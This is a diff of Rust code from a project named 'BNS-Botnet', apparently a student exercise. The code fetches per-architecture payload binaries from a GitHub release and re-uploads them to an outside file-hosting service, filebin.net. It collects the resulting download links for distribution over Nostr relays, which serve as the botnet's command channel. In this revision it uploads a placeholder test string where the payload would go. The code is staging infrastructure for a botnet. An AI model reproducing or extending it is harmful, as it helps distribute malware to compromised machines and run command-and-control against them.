@@ -5,17 +5,50 @@ use bytes::Bytes;
 use nostr_sdk::Client;
 use nostr_sdk::prelude::*;
 use reqwest::Client as RClient;
-use reqwest::multipart::Form;
-use reqwest::multipart::Part;
+use reqwest::header::CONTENT_TYPE;
+use reqwest::header::HeaderMap;
+use reqwest::header::HeaderValue;
 
-mod payload;
+mod response;
 
 const ARCHS: [&'static str; 2] = ["aarch64", "x86_64"];
 const REPO: &'static str = "https://github.com/SenneW-2158088/BNS-Botnet/releases/download/main";
 const PAYLOAD: &'static str = "payload";
-const FILEDUMP: &'static str = "https://filedump.to/";
+
+// Filedump constants
+const FILEDUMP: &'static str = "https://filebin.net";
+const BIN: &'static str = "bns-botenet-payload";
 
 const RELAYS: [&str; 1] = [bns_lib::RELAY];
+
+async fn upload_payload(
+    client: &RClient,
+    architecture: &str,
+    data: Bytes,
+) -> Result<response::FilebinResponse, ()> {
+    let mut headers = HeaderMap::new();
+    headers.insert("accept", HeaderValue::from_static("application/json"));
+    headers.insert("cid", HeaderValue::from_static("botnetclient")); // Id isn't important i guess
+    headers.insert(
+        CONTENT_TYPE,
+        HeaderValue::from_static("application/octet-stream"),
+    );
+
+    let filename = format!("payload-{}", architecture);
+    let url = format!("{}/{}/{}", FILEDUMP, BIN, filename);
+
+    let response = client
+        .post(url)
+        .headers(headers)
+        .body(data)
+        .send()
+        .await
+        .map_err(|_| ())?
+        .json::<response::FilebinResponse>()
+        .await
+        .map_err(|_| ())?;
+    Ok(response)
+}
 
 async fn download_payload(client: &RClient, architecture: &str) -> Result<Bytes, ()> {
     let url = format!("{}/{}-{}", REPO, PAYLOAD, architecture);
@@ -41,16 +74,26 @@ async fn run() -> Result<()> {
         }
     }
 
-    println!("[i] Publishing payloads on filedump");
-    let mut filedump_urls: HashMap<String, String> = HashMap::new();
+    println!("[i] Publishing payloads on filebin");
+
+    // Map of architecture -> url
+    let mut filebin_urls: HashMap<String, String> = HashMap::new();
 
     for (architecture, payload) in payloads {
-        let form = Form::new().part("file", Part::bytes(payload.to_vec()));
-
-        match client.post(FILEDUMP).multipart(form).send().await {
+        match upload_payload(
+            &client,
+            architecture.as_str(),
+            Bytes::from("hello this is a test"),
+        )
+        .await
+        {
             Ok(response) => {
-                let body = response.text().await.unwrap();
-                println!("[+] Got body {}", body);
+                let link = format!(
+                    "{}/{}/{}",
+                    FILEDUMP, response.bin.id, response.file.filename
+                );
+                filebin_urls.insert(architecture, link.clone());
+                println!("[+] Created file dump link {}", link);
             }
             Err(_) => println!(
                 "[-] Error uploading to filedump for architecture {}",
